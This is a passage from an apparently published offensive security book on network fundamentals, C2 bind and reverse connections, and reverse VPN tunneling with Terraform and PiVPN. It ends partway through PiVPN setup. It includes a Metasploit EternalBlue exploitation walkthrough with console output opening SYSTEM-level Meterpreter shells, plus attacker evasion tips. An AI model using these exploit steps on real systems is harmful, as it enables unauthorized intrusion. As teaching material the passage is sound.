APPLYING NETWORK FUNDAMENTALS TO C2 IMPLEMENTATION
The No Starch Press iron logo
Understanding how networks operate is important not only when you’re assessing a target’s infrastructure but also when you’re configuring your own systems for offensive security operations. This chapter starts with a brief refresher on network fundamentals and walks you through a few sample network topologies. Then you’ll apply those concepts, specifically the notion of directionality, to configure a C2 server and implant via the Metasploit framework.

This discussion assumes you already have a decent grasp of networking concepts. If you don’t, I recommend checking out Networking for Beginners, written and published by Russell Scott (2019), to familiarize yourself with the basics before proceeding.

Let’s begin by looking at the Open Systems Interconnection (OSI) model.

The OSI Model
The OSI model, outlined in Table 5-1, consists of seven layers that make up the industry-standard network stack for every system.

Table 5-1: Layers of the OSI Model
Layer

Name

Description

1

Physical layer

Transmits raw data bits across a network through hardware like fiber cables or repeaters

2

Data Link layer

Links devices together via Ethernet devices, switches, and Wi-Fi

3

Network layer

Defines the base protocols for network communications (includes IP addresses and network packets)

4

Transport layer

Defines how data is transported on top of the network layer, such as TCP or UDP

5

Session layer

Facilitates interhost data communication by managing sessions and maintaining connections

6

Presentation layer

Determines how to present the data to the destination that requested or served it (encryption occurs at this layer but is not required)

7

Application layer

Presents digital data acquired from a network communication through an interface such as a web application, API endpoint, or desktop app

Some systems expand upon this stack, and some implement only the lower-level layers; the choice depends entirely on the use case for a given system. For the purposes of this discussion, you’re concerned with only layers 5, 6, and 7, which are the layers your practical implementations will affect most.

Simple Target Network
To see these layers in a more practical context, consider the network diagram in Figure 5-1.

Network diagram showing arrows from a user’s laptop to a web server (right) and database server (bottom), and from the web server to the database server.
Figure 5-1: Directly connecting a user to a web server and database

The user’s laptop is connecting to a web server, which in turn is connecting to a database, presumably to retrieve data for the application it is hosting. In a proper configuration, the user accesses the web server, but the web server can’t access the user directly (because at layer 5 of the OSI model, the network infrastructure should be restricting access to certain ports). The user also can’t access the database directly, and vice versa. In that configuration, the only way for a user to access data from the database is through the web application. The data would be transferred all the way up to layer 6 until the web application reads the information. Once the data is parsed, the end result would be layer 7, where the application itself decides how to display the data.

But that’s not what’s going on here; an arrow clearly points from the user’s laptop to both the web server and the database. Can you spot why? A control should be in place that prevents that arrow from connecting the user to the database. In other words, the core problem isn’t just the access, but the fact that there’s no firewall in place to prevent it.

Network topology designs are important. These details can make the difference between an adversary having access to your network or not. When it comes to IaC specifically, you have to explicitly define all topology components with code. If you forget to define a firewall in your topology, you might also forget to define a network ACL in your Terraform script later when referencing the topology.

Let’s see how adding a firewall to the mix changes the picture (see Figure 5-2).

Network diagram showing a laptop connecting to a firewall on port 443 (HTTPS), which forwards traffic to an internal web server that connects to a MySQL database on port 3306.
Figure 5-2: Introducing a firewall to the network

With the firewall in place, the user can now access the web server only on port 443. Internally, the web server is accessing the database over port 3306, but you could lock that down with an internal firewall too if you wanted. Even without that extra defense-in-depth step, you’re already securing your database from the outside world.

It’s easy to accidentally configure a public-facing database server in a cloud environment, because network configurations in IaC can be a bit different from a standard firewall appliance. With IaC, you simply define your service, and it exists on the internet unless you explicitly restrict it. Although some service providers have now changed the model such that the infrastructure is not exposed by default, only one line of code could accidentally expose a service to the internet. With a traditional firewall, however, you would need to manually configure routing and forwarding to allow connections from an external network to an internal resource—a scenario that, while technically possible, is far less likely to inherently expose sensitive services to the internet. Keep this in mind when designing the network topology for your infrastructure.

Active Directory Target Network
Most networks are a fair bit more complicated than the ones you’ve seen so far. Adding Active Directory to the network, as shown in Figure 5-3, gives you a taste of that complexity.

Network diagram with laptop connecting thru firewall (port 443) to web server linked to MySQL DB (port 3306). Below, isolated Windows Domain Controller and Server share data via many ports.
Figure 5-3: Introducing internal Active Directory systems to the network

You’ve added a simple domain controller and Windows server to compose your Active Directory environment. These Active Directory hosts are segmented from the web server and database but can talk to each other directly.

What if you needed to talk to the Active Directory environment externally? This is a valid question for a common use case of working with remote servers. What you don’t want to do is expose your Active Directory domain to the open internet. This is never a good idea (yet somehow it still happens). This is what a VPN is for. As a service, a VPN is a great way to route your traffic through a new IP address over an encrypted tunnel.

The benefits to this approach are numerous, but most people use a VPN for privacy purposes, to get around region-blocked content, or to unblock themselves from an IP restriction. However, a VPN can do much more. If you control the VPN, you can configure it to let you access resources on another network. Thus, with a VPN and a few firewall rules, you can securely access your Active Directory environment without exposing your infrastructure to the open internet (see Figure 5-4).

Network diagram showing same configuration as figure 5-3 but now with Admin laptop connecting thru VPN (port 1194) to access Domain Controller (port 3389).
Figure 5-4: Configuring a VPN to access the Active Directory environment

Here you’ve introduced a new Admin user trying to access their remote Active Directory servers. Instead of exposing those Active Directory ports, you simply set up a VPN server. This VPN server exposes a port, the default OpenVPN port of 1194 in this case, that listens on the firewall. Anyone can access this port, but they’ll need some sort of credential to authenticate to it. Without this credential, they can’t do anything unless the service has a vulnerability they can exploit. As long as they have the proper credential, the network will establish an encrypted tunnel, providing a secure connection to the VPN server. The VPN server will then have routes to the internal hosts, which the Admin can use to seamlessly remote-desktop into their domain controller over a secure connection.

This is a small-scale version of a common configuration for many enterprise environments that you may already be familiar with. Understanding this layout is critical, as you’ll be taking advantage of some of these technologies in Chapters 7 and 8 and in the four scenarios in Chapters 9 through 12.

Now, we’ll take a deeper dive into networking specifically through the lens of C2 infrastructure. It’s important to understand how C2 operates from a network perspective, since you’ll apply these networking fundamentals strategically to deploy C2 configurations that fit your operational goals. There’s no wrong way to take control of a system, but one method or networking protocol may be more appropriate than another for a certain C2 use case, and you need to be able to make that determination.

Command-and-Control Network Flows
Let’s begin by exploring what C2 network flows look like in terms of the typical client/server architecture design principles we’ve been looking at. Normally when you visit a website on the internet, your client (see Figure 5-5) is connecting to a server that is hosting the website’s content.

Network diagram showing an arrow from a laptop on the left to a server on the right, the standard client-to-server connection flow direction.
Figure 5-5: A typical connection from client to server

The server usually has a firewall allowing inbound traffic from the web service on port 80 or 443. This configuration allows your client to both send and receive data to and from the server over the same port.

Although this connection may appear bidirectional from your perspective as the client, the server is never connecting back to your client system (see Figure 5-6).

Network diagram with an arrow from laptop on left to server on right. Another arrow from server to laptop ends with an X, as servers can’t connect to clients.
Figure 5-6: A server without direct access to the client

This is because the majority of home networks have their own firewall by default on the home router, which is what routes all traffic to the web server. The router has no inbound ports open for the web server to connect to in order to route data back to the client.

Let’s pretend, however, that a connection to port 80 is open on your router, as shown in Figure 5-7.

Network diagram showing bidirectional connections from a client laptop (left) to server (right) on port 443, and from server back to client on port 80.
Figure 5-7: Allowing port forwarding to the client on port 80

In this case, after you make a connection, the server could feasibly talk to your client via your router. Nothing would happen unless you’re running a service of your own and you port-forward it from the router to your client; in that scenario, your service would be accessible to the server. Port forwarding is used to direct incoming traffic on a specific router or firewall port to a designated device or service within a private network. This network configuration technique enables external devices to access a service on a private network, bypassing the restrictions of the router or firewall.

This is not a typical configuration on the modern internet because of the multiple security risks and routing issues it could cause. So how do attackers compromise systems over the open internet? Enter bind and reverse connections.

Bind Connections
In a bind connection, the C2 server establishes a listener on a specific port of the target client system. Specifically, the compromised client system binds to that port to listen for incoming connections from the C2 server, which can then gain access to execute commands, exfiltrate data, or escalate privileges. (From here on, I’ll describe the network communications from the C2 server’s perspective—that is, you are no longer the client laptop; you’re the C2 server.) Figure 5-8 shows a C2 server making a bind connection over port 4444 to a client it has compromised.

Network diagram with arrow pointing from a command and control server (right) to a client laptop (left) using a bind connection over port 4444.
Figure 5-8: A bind connection over port 4444

NOTE
The port number here is arbitrary, but it’s a common default for the Metasploit framework’s Meterpreter payload. Avoid using port 4444 in real-world operations unless you’re emulating a less sophisticated threat; otherwise, it will give you away. Metasploit payloads employ various protocols and programming languages, but they all allow you to choose between a bind or reverse connection for your implant, so we’ll be using them in the upcoming examples. I’ll talk more about Metasploit in the next section.

Fortunately for the security of most networks, this bind connection will fail unless your C2 server is already inside the internal network. If you’re outside the internal network or if the internal network has good network segmentation rules, you’ll fail at exploiting the client system to run a bind shell. If you run a successful exploit, your bind payload implant can still run a bind shell service, but the network won’t be accessible from the outside and thus you won’t be able to connect to it. To overcome this limitation, you need a reverse connection.

Reverse Connections
In a reverse connection, which is the kind you’ve been building so far in this book, the listener resides on the C2 server, not on the target client system, and the client system initiates the connection to the C2 server, not vice versa (see Figure 5-9). In other words, rather than reaching out to the implant as in the bind connection, the C2 server listens on a port (in this case, port 4444 again), and your C2 implant connects directly to it.

Network diagram with arrow pointing from a client laptop (left) to a command and control server (right) via a reverse connection over port 4444.
Figure 5-9: A reverse connection over port 4444

Most computers connected to a network with internet access can talk to external hosts, which is how your client in Figure 5-5 was able to talk to the web server. But now the target system is talking to your C2 server directly. Of course, a network with proper egress controls might block obscure ports and protocols, but if your server receives HTTP and is listening on port 443, most client hosts will be able to connect to it. This is why most C2 frameworks implement their implants as reverse shells by default; they are almost guaranteed to work.

That being said, bind shells are not pointless. They can have great value when ingress is possible, but egress is not, or for lateral movement on internal networks. If your C2 server becomes restricted, you can always reconnect to your bind shell from another location, since the bind shell’s service should still be running.

Table 5-2 summarizes the differences we’ve just discussed between bind and reverse connections.

Table 5-2: Comparing Bind and Reverse Connections
Bind connection

Reverse connection

Initiator of connection

C2 server connects to target system

Target connects to C2 server

Listener location

On the target machine

On the C2 server

Firewall evasion

Less effective

More effective

Stealth level

Easier to detect

Harder to detect

Now let’s go into more depth on a C2 framework that consistently supports both bind and reverse shells: Metasploit.

Exploitation with the Metasploit Framework
As mentioned previously, Metasploit’s payload options allow you to select either a bind or reverse shell for almost any exploitation module or even a raw implant. You can generate these payloads inside Metasploit’s primary interface, known as msfconsole, or with the framework’s standalone payload-generation tool msfvenom, giving you flexibility during an engagement. If you’re able to exploit a vulnerability, you get to choose which way to connect before you launch your implant’s code. Here’s how a bind shell payload works to exploit the infamous EternalBlue vulnerability (https://en.wikipedia.org/wiki/EternalBlue) with Metasploit:

PAYLOAD => windows/x64/meterpreter/bind_tcp
msf5 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   RHOSTS            192.168.2.104    yes       The target host(s), range CIDR identifier, or
                                                hosts file with syntax 'file:<path>'
   RPORT             445              yes       The target port
   SMBDomain         *                no        (Optional) The Windows domain to use for
                                                authentication
   SMBPass           no               no        (Optional) The password for the specified
                                                username
   SMBUser           no               no        (Optional) The username to authenticate as
   VERIFY_ARCH       true             yes       Check if remote architecture matches exploit
                                                Target.
   VERIFY_TARGET     true             yes       Check if remote OS matches exploit Target.

Payload options (windows/x64/meterpreter/bind_tcp):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   EXITFUNC          thread           yes       Exit technique (Accepted: '', seh, thread,
                                                process, none)
   LPORT             4444             yes       The listen port
   RHOST             192.168.2.104    no        The target address

Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
Notice that the bind shell takes a parameter of RHOST instead of LHOST and has the same value (192.168.1.104) as your target’s RHOSTS parameter because you’re telling your payload which remote host to listen on. LPORT is the port your remote target will configure to listen for C2 server connections.

Executing a Bind Shell
This exploit successfully executes a Meterpreter bind shell:

msf5 exploit (windows/smb/ms17_010_eternalblue) > exploit -j
[+] Exploit running as background job 2.
[+] Exploit completed, but no session was created.
...
[*] 192.168.2.104:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.2.104:445 - Host is Likely VULNERABLE to MS17-010! - Windows 7 Professional 7601
                        Service Pack 1 x64 (64-bit)
...
[+] Started bind TCP handler against 192.168.2.104:4444
[*] Sending stage (206403 bytes) to 192.168.2.104
[*] Meterpreter session 3 opened (0.0.0.0:0 -> 192.168.2.104:4444) at 2025-04-18 04:39:29-0400
[+] 192.168.2.104:445 - ============================
[+] 192.168.2.104:445 -      === WIN ===
[+] 192.168.2.104:445 - ============================
This works, however, only because you’re on the same network as the target system, and you’re running the shell with full administrative privileges. This level of privilege means your implant can open any port it wants. Remember, in a real-world scenario, you’d want to change the port from 4444 for operational security, but it works fine here for purposes of demonstration.

Privileged TCP ports (any TCP port below 1024) are reserved for use by privileged users on a system, though they do not have to be root or Administrator. Standard users can open ports 1025 through 65535. In this example, port 4444 would have worked even if the exploit hadn’t run with elevated privileges, unless the Windows firewall was properly configured to block inbound connections.

Leave this shell open as you progress through the next section so you’ll be able to compare the connection flows Metasploit displays for bind and reverse shells.

Executing a Reverse Shell
If you configure this exploit again but with a reverse shell payload, you’ll see slight differences:

PAYLOAD => windows/x64/meterpreter/reverse_tcp

msf5 exploit (windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

Name          Current Setting Required Description
----          --------------- -------- -----------
RHOSTS        192.168.2.104   yes      The target host(s), range CIDR identifier, or
                                       hosts file with syntax 'file:<path>'
RPORT         445             yes      The target port (TCP)
SMBDomain     *               no       (Optional) The Windows domain to use for authentication
SMBPass       no              no       (Optional) The password for the specified username
SMBUser       no              no       (Optional) The username to authenticate as
VERIFY_ARCH   true            yes      Check if remote architecture matches exploit Target.
VERIFY_TARGET true            yes      Check if remote OS matches exploit Target.

Payload options (windows/x64/meterpreter/reverse_tcp):

Name          Current Setting Required Description
----          --------------- -------- -----------
EXITFUNC      thread          yes      Exit technique (Accepted: '', seh, thread, process,
                                       none)
LHOST         192.168.2.169   yes      The Listen address (an interface may be specified)
LPORT         4444            yes      The Listen port

Exploit target:

Id  Name
--  ----
0   Windows 7 and Server 2008 R2 (x64) ALL Service Packs
Now, you’re changing the LHOST parameter instead of the RHOST parameter to set up a listener job on Metasploit’s multi/handler module, which will listen on port 4444 of your C2 server. This time, the LHOST parameter value is the IP address of your C2 server instead of the remote address of your target server.

Now you can run this exploit with the exploit -j command:

msf5 exploit (windows/smb/ms17_010_eternalblue) > exploit -j
[*] Exploit running as background job 3.
[*] Exploit completed, but no session was created.
...
[*] 192.168.2.104:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.2.104:445 - Host is Likely VULNERABLE to MS17-010! - Windows 7 Professional 7601
                        Service Pack 1 x64 (64-bit)
...
[+] 192.168.2.104:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[+] 192.168.2.104:445 - Sending egg to corrupted connection.
[*] 192.168.2.104:445 - Triggering free of corrupted buffer.
[*] Sending stage (206403 bytes) to 192.168.2.104
[*] Meterpreter session 4 opened (192.168.2.169:4444 -> 192.168.2.104:58347) at
                        2025-04-18 04:40:26 -0400
You won’t see any difference on the surface, but leave this shell open as well so you can look a bit closer at the connection flows.

The Implications of Connection Directionality
With both Meterpreter sessions open, run the following command to list your currently established sessions:

msf5 exploit (windows/smb/ms17_010_eternalblue) > sessions

Active sessions
Id  Name         Type         Information                       Connection
--  ----         ----         -----------                       ----------
3   meterpreter  x64/windows  NT AUTHORITY\SYSTEM @ BIGGIE-PC   0.0.0.0:0 ->
                                                                192.168.2.104:4444
                                                                (192.168.2.104)
4   meterpreter  x64/windows  NT AUTHORITY\SYSTEM @ BIGGIE-PC   192.168.2.169:4444 ->
                                                                192.168.2.104:58347
                                                                (192.168.2.104)
msf5 exploit (windows/smb/ms17_010_eternalblue) >
Under the Active sessions heading, you’ll see some very different connection strings. For the bind shell, 0.0.0.0 -> 192.168.2.104:4444 indicates that your C2 server is connecting via port 4444 to your target host on all interfaces. For the reverse shell, the -> indicator is flowing the same way, but you can tell that your C2 server is listening on port 4444 and has control over the remote target because the target host is running its connection off an ephemeral port, 58347. Ephemeral ports are randomly assigned ports in the range 49152 to 65535 that are used to make outbound connections between hosts (technically, they can also be used to host services, but they rarely are). So although the arrow symbol’s direction is a bit confusing for a reverse connection in Meterpreter, because your target host is using an ephemeral port, you know it’s communicating back to your C2 server listening on port 4444.

Once again, we’re back to the book’s core premise that malware is software. C2 communications are just an extra layer on top of client/server architecture. Your implant is the client, and the C2 server is the server; it’s that simple. The only difference between C2 servers and web servers is in the way you apply directionality strategically for offensive security purposes. C2 server communications are also not inherently malicious. Consider SSH and Remote Desktop Protocol (RDP), both of which are remote access protocols that give the user full command over the target server. A Meterpreter shell is inherently no different: It likewise gives the user remote access to the target server. Now, obviously, a Meterpreter implant has a lot of built-in capabilities that a user could leverage for nefarious purposes, but there’s nothing you can do with Meterpreter that you can’t also do with normal SSH or RDP access.

Summary
The takeaway here is not “use OSTs for server administration” (a bad idea that could expose a system to further risk), but that the OSTs we’ve discussed here are fundamentally no different from tools specifically built for remote system access. If you wanted to build a system administration tool instead of an offensive security C2 tool, the only change you might want to make before selling the tool is removing features that enable more offensive security–focused operations (such as Local Security Authority Subsystem Service, or LSASS, process dumping). Otherwise, as long as it is properly secured, the tool is the same programmatically. How the user applies the tool, and not the software itself, is what makes the difference.

For an attacker, this also means you can and should make use of most remote system administration tools. It’s a great way to get around common security controls via trusted software. On the other hand, standard OSTs are going to equip you with better means of post-exploitation and mass management of systems from an attacker’s perspective. The tools that seem best for the attack are always the direction you should go, but be aware of your options. Their tools are your tools too.

6 REVERSE VPN TUNNELING

6
REVERSE VPN TUNNELING
The No Starch Press iron logo
The concept of directionality applies to technologies and tools other than C2, such as VPNs. Traditional VPN setups follow a client-to-server model: Clients connect through a VPN server to access the internet or a private network. However, you can flip this model around as part of an offensive security strategy, having the server connect back to the clients in what’s known as a reverse VPN tunnel. In this chapter, I’ll walk you through configuring a reverse tunnel over a VPN to gain access to a network that is normally inaccessible from the outside.

Reverse VPN Topology
Say you have a dropbox on a client’s local network that you need to access remotely. This network is illustrated in Figure 6-1.

Network diagram showing a cloud VPN server with 3 servers below: 1 (left) is blocked from VPN (marked by X), 2 (middle) connects to VPN, and 3 (right) connects to 1.
Figure 6-1: The network configuration prior to reverse VPN tunneling

This network has three servers. Server 2 is your dropbox system, which should have access to your VPN server. Server 1 is explicitly blocked from connecting outbound over the internet. Server 3 has no inherent restrictions but can’t yet connect to Server 2. Server 2 can’t directly access Server 1 but could access Server 3 if you can connect Server 3 to your VPN. Then, of course, Server 3 can directly access Server 1.

In your theoretical attack chain, your goal would be to compromise Server 3 through your dropbox server (Server 2). Then, using Server 3, you could compromise Server 1. In this section, I’ll show you how to use a reverse VPN connection to do just that.

Compromising a Server for Reverse VPN Tunneling
Let’s assume you’ve already compromised Server 3, and it can now access both your VPN server and Server 1, as shown in Figure 6-2.

Network diagram from Figure 6-1, but now server 3 connects to both VPN and server 1. Server 1 is still blocked from VPN and Server 2 still connects to VPN.
Figure 6-2: Pivoting through Server 3 to compromise Server 1

Using Reverse VPN Tunnel Path Topology
You could use C2 tools and proxies to pivot through this network, but let’s assume you now have administrator access. Because you have the appropriate privileges, you can install a VPN client on your dropbox and Server 3 and then configure them both to connect to your VPN server. From there, you can use the network created by the VPN to directly access the hosts. Instead of having to rely on C2 implants, you can use SSH or RDP to connect directly into the host; all you need are the credentials you gained after the initial compromise of Server 3. Once you have this setup configured, you can easily pivot from Server 3 to Server 1, as shown in Figure 6-3.

Network diagram from Figure 6-2, but now VPN sends tunnel path to servers 2 and 3. Server 1 is still blocked from VPN and server 3 still connects to server 1.
Figure 6-3: Establishing a reverse VPN tunnel from Server 3 to Server 1

Obviously, this scenario assumes a lot of access that you probably wouldn’t have in the real world, but it demonstrates how the data flow in a reverse VPN tunnel mirrors that of the reverse shell connection used in C2 systems. Both approaches create a path from the target system back to your control point.

Configuring an EC2 Instance with Terraform
Now let’s apply reverse VPN tunneling in a more practical use case. You’ll spin up your own VPN server by using Terraform and connect a client to it. To do this, you’ll revisit the GitHub project from Chapter 4 (https://github.com/3ndG4me/Offensive-Security-Engineering). All the Terraform configuration and deployment steps will be the same as in that chapter, but now you’ll see the technique in action over the open internet to get a taste of how it is applied in real-world operations.

The Terraform code you’ll use is in the base-vpn directory of the Offen-sive Security Engineering GitHub project. You’ll also use an Ubuntu VM powered by VirtualBox (https://www.virtualbox.org) and Vagrant (https://github.com/hashicorp/vagrant), which is located in the vagrant-ubuntu directory. Much like Terraform, Vagrant is a tool that lets you configure and deploy VMs for local hypervisors (such as VirtualBox) by using a Ruby-based IaC syntax. I’ll go into more detail on how you’ll use Vagrant later in this chapter. For now, all you need to know is that this VM is the client you’ll be accessing through your reverse VPN tunnel.

To get your VPN server up and running, navigate to the base-vpn directory and run terraform init to initialize the project, as you did in Chapter 4. Then run the following to see a preview of what the code will do when you execute it:

$ terraform plan
Refreshing Terraform state in-memory prior to plan...
The refreshed state will be used to calculate this plan, but will not be
persisted to local or remote state storage.

data.aws_ami.ubuntu: Refreshing state...
...
+ id = (known after apply)
+ ingress = [

  + cidr_blocks = [
      "0.0.0.0/0",
    ]
  + description = ""
  + from_port = 1194
  + ipv6_cidr_blocks = []
  + prefix_list_ids = []
  + protocol = "udp"
  + security_groups = []
  + self = false
  + to_port = 1194
  }

  + cidr_blocks = [
      "0.0.0.0/0",
    ]
  + description = ""
  + from_port = 22
  + ipv6_cidr_blocks = []
  + prefix_list_ids = []
  + protocol = "tcp"
  + security_groups = []
  + self = false
  + to_port = 22
]
...
The key components being configured here are ports 22 and 1194, which will both be open to the public internet—port 22 for remote access via SSH, and port 1194 for OpenVPN server connections. These port configurations are defined in the Terraform resource groups as follows:

# Put your IP here to whitelist it for ssh.

variable "access_addr" {
  type    = string
  default = "0.0.0.0/0"
}

resource "aws_security_group" "vpn_group" {
  name        = "vpn_group"
  description = "Allow Ports for VPN and SSH access"

  # Open the default OpenVPN Port.
  ingress {
    from_port   = 1194
    to_port     = 1194
    protocol    = "udp"
    cidr_blocks = ["0.0.0.0/0"]
  }
}
Port 1194 specifically uses UDP since OpenVPN is optimized for UDP connections.

Accessing the Reverse VPN Server Instance
Now that you’ve reviewed your plan, you’re ready to spin up your server. Run the terraform apply command. You’ll see the changes Terraform is going to execute and then be prompted to confirm.

Once the script has been executed, Terraform will display your new VPN server’s public IP address. Make sure to save this IP address because you’ll need it for the next step.

Now connect to your server by using SSH, the key you previously configured in your Terraform code, and your VPN server’s IP address:

$ ssh -i your-key.pem ubuntu@your-server-ip
When asked if you want to continue connecting, type yes.

Simulating a Dropbox with Vagrant
Next, you’ll set up your VM with Vagrant. Vagrant was created by the same developers as Terraform, but whereas Terraform manages cloud resources, Vagrant manages VMs on your own system through platforms like VirtualBox and VMware. In fact, if you wanted to create the hosts from any of the examples without using a cloud provider like AWS, you could use Vagrant instead and test your configurations locally before moving them to hosted servers.

Navigate to the vagrant-ubuntu directory. If you haven’t yet installed Vagrant, follow the installation instructions for your operating system at https://developer.hashicorp.com/vagrant/downloads. Vagrant is an all-in-one binary, so if you choose to download it without a package manager, make sure you’re running the executable from the path where you saved it.

NOTE
If you run into issues with Vagrant, you can manually configure two VMs yourself. For this example, the VMs are running a base version of the Ubuntu operating system with the OpenVPN client installed.

Once you have Vagrant installed and are in the vagrant-ubuntu directory, install the VM like so:

$ vagrant up
Bringing machine 'default' up with 'virtualbox' provider...
==> default: Checking if box 'ubuntu/bionic64' version "20200416.0.0" is up to date...
==> default: Clearing any previously set forwarded ports...
==> default: Clearing any previously set network interfaces...
==> default: Preparing network interfaces based on configuration...
    default: Adapter 1: nat
==> default: Forwarding ports...
    default: 22 (guest) => 2222 (host) (adapter 1)
==> default: Running 'pre-boot' VM customizations...
==> default: Booting VM...
==> default: Waiting for machine to boot. This may take a few minutes...
    default: SSH address: 127.0.0.1:2222
    default: SSH username: vagrant
    default: SSH auth method: private key
==> default: Machine booted and ready!
==> default: Checking for guest additions in VM...
    default: The guest additions on this VM do not match the installed version of
    default: VirtualBox! In most cases this is fine, but in rare cases it can
    default: prevent things such as shared folders from working properly. If you see
    default: shared folder errors, please make sure the guest additions within the
    default: virtual machine match the version of VirtualBox you have installed on
    default: your host and reload your VM.
    default:
    default: Guest Additions Version: 5.2.34
    default: VirtualBox Version: 6.0
==> default: Mounting shared folders...
    default: /vagrant => /Users/caseyerdmann/Desktop/Offensive-Security-Engineering
/vagrant-ubuntu
==> default: Machine already provisioned. Run 'vagrant provision' or use the '--provision'
==> default: flag to force provisioning. Provisioners marked to run always will still run.
This VM will be your VPN client. Normally, you wouldn’t be able to access the VM over the internet without first configuring firewall and network rules, but with the VPN server, you’ll be able to access the VM from anywhere without touching those settings. Before you can do anything, though, you’ll need to install the OpenVPN client on your VM. Run the command vagrant ssh to do so.

After creating the VM, install the OpenVPN client by running sudo apt install openvpn.

Now you’ll go back to your AWS-based Ubuntu server and set up your OpenVPN server. There are many ways to do this, but we’ll be using the PiVPN project (https://www.pivpn.io).

Configuring OpenVPN with PiVPN
The PiVPN project was originally designed for Raspbian, the Raspberry Pi operating system. Like Ubuntu, Raspbian is based on the Debian Linux distribution, making PiVPN fully compatible with your cloud-based Ubuntu Linux server and allowing you to take advantage of a simple setup script to configure an OpenVPN server in AWS.

To install PiVPN, run the following command while SSH’d into your AWS server:

$ sudo curl -L https://install.pivpn.io | bash
Running this script will begin the PiVPN installation process.

NOTE
Running scripts from the internet directly into bash (especially as sudo/root) can be dangerous and is generally not advised. That said, this script is from a trusted source, and executing it in your test environment is relatively safe. If you prefer, however, you can manually install PiVPN from https://github.com/pivpn/pivpn.

Selecting OpenVPN Configuration
For the most part, you’ll be running PiVPN with the default configurations, but I’ll walk you through each step to ensure that it is installed properly.

First, you’ll see the PiVPN Automated Installer screen, shown in Figure 6-4.

A terminal interface showing the first step of PiVPN installation, prompting user to select OK to begin installing either OpenVPN or WireGuard.
Figure 6-4: Configuring PiVPN via the Automated Installer

Click Ok. Next you’ll see a screen that informs you that your VPN server will need a static IP address. This is already the default setting on your EC2 server, so click Ok.

Next you’ll see a screen that allows you to disable IPv6 for the VPN service. When IPv6 is blocked, a client’s IPv4 address will be disguised as the VPN server’s IPv4 address, while IPv6 traffic is blocked entirely. The only downside is that IPv6 traffic might slow responses from IPv6 servers if the client tries to access them via this VPN. Since you’re not using IPv6 networking for this example, select Yes to block IPv6 for your instance.

On the following screens you’ll confirm your static IP configuration and then select the ubuntu user. By default, only the ubuntu user is installed on your server. This is fine for our purposes. If you were configuring this user for a long-term use case, you might consider running OpenVPN under a separate user with privileges specifically for the VPN services.

You’ll then be prompted to choose between WireGuard and OpenVPN. Choose OpenVPN, and then accept PiVPN’s suggested default configuration, as shown in Figure 6-5.

Installation mode screen with 3 defaults: use UDP protocol, no custom DNS search domain, and enable modern features (256-bit certificate + TLS encryption). Yes is selected.
Figure 6-5: Accepting PiVPN’s suggested default configuration

If you select No, you’ll have to configure your custom preferences at each step. Select Yes, which will prepopulate the next screens so that you can simply click Ok to proceed.

Configuring OpenVPN Service and DNS
Next, you’ll accept UDP as the network protocol for your VPN server. As PiVPN’s caveat “please only choose TCP if you know why you need TCP” implies, you should almost always use UDP. Your Terraform code already configured your network security groups to use UDP for port 1194, so UDP is not only the default but also more convenient.

The Default OpenVPN Port screen will prompt you for the listening port. It should list 1194 by default, but if not, enter 1194 and click Ok.

Then you’ll configure the DNS server that your VPN clients will use to resolve DNS queries (see Figure 6-6). This screen allows you to select an option from a list or set a custom DNS provider. You can stick with the default DNS server, Quad9, and then click Ok.

DNS provider selection screen with options Quad9 (selected), OpenDNS, Level3, DNS.WATCH, Norton, and FamilyShield. OK and Cancel buttons appear at bottom.
Figure 6-6: Configuring the VPN service’s upstream DNS provider

Then you’ll be asked whether you’d like to configure a custom search domain. There’s no reason to do that for this example, so click No to continue.

On the Public IP or DNS page, you’ll specify the static IP address or domain name that your VPN clients will use to connect to your VPN server. Select the EC2 instance public IP address provided earlier in the chapter.

NOTE
In later chapters, you might see a custom subdomain of injection.sh in some examples. This is just a test domain I’m using for demonstration purposes. To use your own domain name with the VPN server or in the upcoming examples, you’ll need to either use a domain you already own or purchase a new one. Once you have a domain, you can update its DNS records to point to your EC2 instance’s IP address.

Setting OpenVPN Encryption Strength
You’ll next choose whether you’d like to use OpenVPN 2.4 or a different version. At the time of this writing, version 2.6.14 is the latest, but PiVPN may use 2.4 or 2.5 depending on whether you’re using the latest installer. If OpenVPN has been updated by the time you’re following along with this exercise, click Yes to accept the latest version.

Version 2.4 improves cryptographic security by implementing Elliptic Curves alongside Rivest-Shamir-Adleman (RSA), an asymmetric cryptographic algorithm that uses public-private key pairs (hence asymmetric) to encrypt the VPN traffic. The higher the bit size used to define this key pair, the stronger the security (that is, the more mathematical complexity it would take to brute-force the key). By combining RSA with the computational power provided by Elliptic Curves, OpenVPN can achieve strong security with smaller, more efficient keys.

With that, you’re now ready to generate the OpenVPN server certificates for encryption. The ECDSA Certificate Size page will prompt you to choose the RSA bit size.

While longer key lengths provide stronger encryption, they also take more time to generate. The 256-bit option offers a good balance between security and performance for most use cases, including this example. Select 256 and then click Ok. Then you’ll be notified that the server key and hash-based message authentication code (HMAC) key will be generated. Select Ok once again, and the script will handle all the cryptographic key generation for you.

Setting OpenVPN Post-Installation Configurations
Next, PiVPN will ask whether you would like to configure unattended upgrades.

Unattended security patching allows your server to automatically update most important system packages, meaning your server stays patched without requiring your intervention. While some packages are exempt from or not supported by this feature, I recommend enabling automatic updates on your production servers whenever possible to maintain security. In this case, since you’re eventually going to tear down this server with Terraform, this option doesn’t really matter, but select Yes anyway to get into the habit. Then you’ll get confirmation that the PiVPN installation has completed.

Finally, you’ll be prompted to reboot the server. Click Yes to initiate the reboot, and you’re done with the PiVPN installation! Once your server has rebooted, you can log back in via SSH.

Generating a VPN Certificate
Now you’ll need to generate a VPN certificate. This certificate will be used to authenticate to the VPN. VPN certificates are functionally similar to an SSH key in that you can provide just the certificate to your VPN client or even configure the certificate to require a password for additional security.

One other benefit to using PiVPN is that it makes managing your OpenVPN server via the command line fairly simple via pivpn. This command line tool can create new client certificates for you, list your active clients, revoke certificates, and even update or back up service configurations. You’ll want to run the pivpn command with sudo most of the time so it has access to the resources it needs, as shown here:

ubuntu@ip-172-31-48-195:~$ sudo pivpn
::: Control all PiVPN specific functions!
:::
::: Usage: pivpn <command> [option]
:::
::: Commands:
